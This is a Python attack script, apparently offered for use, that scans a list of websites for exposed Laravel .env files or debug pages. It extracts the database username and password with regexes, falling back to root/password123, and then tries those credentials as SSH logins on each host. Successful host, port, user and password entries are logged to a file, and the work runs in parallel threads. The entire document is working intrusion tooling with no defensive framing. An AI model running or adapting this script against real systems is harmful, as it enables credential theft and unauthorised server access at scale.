import requests
import paramiko
import re, sys
from concurrent.futures import ThreadPoolExecutor

def bann():
    x = """
        [+] SSH Cracker [+]
[-] Cracker From Laravel Config [-]\n
"""
    print(x)

class Oke:
    def __init__(self, url, resp):
        self.url = url
        self.resp = resp
        self.ip = self.url.split('/')[2]
        self.port = 22
    
    def getup(self):
        try:
            if 'DB_USERNAME=' in self.resp:
                u = re.findall('\nDB_USERNAME=(.*?)\n', self.resp)[0]
                p = re.findall('\nDB_PASSWORD=(.*?)\n', self.resp)[0]
            elif '<td>DB_USERNAME' in self.resp:
                u = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', self.resp)[0]
                p = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', self.resp)[0]
            else:
                u = 'root'
                p = 'password123'
        except:
            u = 'root'
            p = 'password123'
        finally:
            return u, p
        
    def connect(self):
        try:
            user, passwd = self.getup()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.ip, self.port, user, passwd)
            tes = ssh.exec_command('ls')
            saved = '{}|{}|{}|{}'.format(self.ip, str(self.port), user, passwd)
            if tes:
                print('[+] Success login > {} [+]'.format(saved))
                svw = open('sshlog.txt', 'a')
                svw.write(saved+'\n')
                svw.close()
        except Exception as e:
            print(str(e))
            
def main(url):
    resp = False
    vuln = url+'/.env'
    try:
        req = requests.get(vuln, timeout=14).text
        if 'DB_USERNAME' in req:
            resp = req
        else:
            req = requests.post(url, data={1: 1}, timeout=7).text
            if '<td>APP_KEY' in req:
                resp = req
    except Exception:
        print('[*] Cant Connect To Sites > {} [*]'.format(url))
    if resp:
        iz = Oke(url, resp)
        iz.connect()
    else:
        print('[-] Not Laravel > {} [-]'.format(url))


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage : python3 {} yourlist.txt'.format(sys.argv[0]))
    else:
        bann()
        target = open(sys.argv[1], 'r').read().splitlines()
        if '://' not in target[0] or '://' not in target[1]:
            target = ['http://'+xx for xx in target]
        else:
            pass
        with ThreadPoolExecutor(max_workers=10) as exc:
            exc.map(main, target)
